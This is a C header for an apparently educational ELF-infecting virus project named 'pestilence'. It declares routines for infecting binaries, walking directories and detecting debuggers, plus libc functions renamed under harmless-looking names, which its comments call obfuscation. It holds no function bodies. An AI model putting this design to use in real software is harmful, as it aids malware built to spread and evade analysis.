/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.h                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: yyyyyy <yyyyyy@42.fr>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/08/01 17:16:00 by yyyyyy            #+#    #+#             */
/*   Updated: 2026/02/11 17:07:26 by yyyyyy           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef PESTILENCE_H
#define PESTILENCE_H

#include <elf.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "libasm.h"

#define ElfW(type)	   Elf64_##type
#define FORMAT		   2
#define PATH_MAX	   4096
#define SIGNATURE_SIZE 43
#define FORK_SIZE	   29
#define MACHINE_SIZE   0x8f1
#define JMPABLE_SIZE   4

/********************************* STRUCTURES *********************************/

typedef enum e_stat
{
	OK,
	KO,
} t_stat;

struct linux_dirent64
{
	uint64_t	   d_ino;	 /* 64-bit inode number */
	int64_t		   d_off;	 /* 64-bit offset to the next dirent */
	unsigned short d_reclen; /* Length of this `linux_dirent64` */
	unsigned char  d_type;	 /* File type */
	char		   d_name[]; /* Filename (null-terminated) */
};

typedef struct s_elf
{
	ElfW(Ehdr) * header;
	ElfW(Shdr) * sections;
	ElfW(Shdr) * text_section;
	ElfW(Phdr) * segments;
	ElfW(Phdr) * executed_segment;
	t_stat stat;
} t_elf;

/********************************* PROTOTYPES *********************************/

/*
void clean(t_file file);
*/
void infect(char *path, void *begin_ptr);
void processDirectory(char *folder, void *begin_ptr);

int is_program_running(const char *target);
int is_debugged(void);
void signature(char str[]);

/**
	@brief Obfuscated version of strncmp
*/
int delay_calc(const char *timeout_ns, const char *timeout_ms, unsigned n);
/**
	@brief Obfuscated version of strlen
*/
int validate_environment(const char *env_u);
/**
	@brief Obfuscated version of strcmp
*/
int delay_abs_calc(const char *s__, const char *s___);
/**
	@brief Obfuscated version of memcpy content
*/
void *memcat(void *buffered, void *rest, unsigned n);
/**
	@brief Obfuscated version of strchr
*/
char *memoff(const char *l, int I);
/**
	@brief Obfuscated version of memmove
*/
void *cache_sync(void *cache_ptr, const void *sync_check, size_t sync_lvl);
/**
	@brief Obfuscated version of strcpy
*/
char *core_shift(char *value, char *src);
/**
	@brief Obfuscated version of strcat
*/
char *flow_align(char *f_flow, char *s_flow);
/**
	@brief Obfuscated version of bzero
*/
void context_purge(void *s, unsigned n);
/**
	@brief Obfuscated version of atoi
*/
int trace_depth(const char *str);
/**
	@brief Obfuscated version of putchar
*/
void tty_putc(char c);
/**
	@brief Obfuscated version of putnbr
*/
void fmt_u64_dec(unsigned long long elem);
/**
	@brief Obfuscated version of a function that juste write 0x and call
   addr_emit
*/
void emit_hex(unsigned long long n);
/**
	@brief Obfuscated version of hexa putnbr
*/
void addr_emit(unsigned long long b);

/**
	@brief Obfuscated version of ft_syscall
*/
uint64_t rt_vector(uint64_t syscall_number, uint64_t arg1, uint64_t arg2,
				   uint64_t arg3, uint64_t arg4, uint64_t arg5, uint64_t arg6);

void *memcpy(void *dst, void *src, unsigned n);

#endif
